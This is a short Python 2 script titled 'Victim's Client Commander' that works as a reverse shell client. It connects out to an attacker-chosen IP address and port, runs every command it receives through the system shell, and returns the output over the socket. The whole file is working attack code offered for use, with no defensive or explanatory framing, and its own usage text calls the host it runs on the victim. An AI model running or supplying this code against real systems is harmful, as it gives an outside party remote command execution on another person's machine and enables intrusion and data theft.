#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import socket
import argparse


def usage():
    print '\n\nExample:'
    print 'victim_client.py -a 192.168.0.33 -p 9999'
    exit(0)


def execute_command(cmd):
    cmd = cmd.rstrip()  # Remove leading whitespaces

    try:
        results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception, e:
        results = 'Could not execute the command: ' + cmd

    return results


def rcv_data(client):
    try:
        while True:
            rcv_cmd = ''
            rcv_cmd += client.recv(4096)

            if not rcv_cmd:
                continue

            client.send(execute_command(rcv_cmd))

    except Exception, e:
        print str(e)
        pass


def client_connect(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((host, port))

        print 'Connected with %s:%d' % (host, port)

        rcv_data(client)

    except Exception, e:
        print str(e)
        client.close()


def main():
    parser = argparse.ArgumentParser('Victim\'s Client Commander')
    parser.add_argument('-a', '--address', type=str, help='The server IP address')
    parser.add_argument('-p', '--port', type=int, help='The port number to connext with', default=9999)

    args = parser.parse_args()

    if args.address is None:
        usage()

    client_connect(args.address, args.port)


if __name__ == '__main__':
    main()
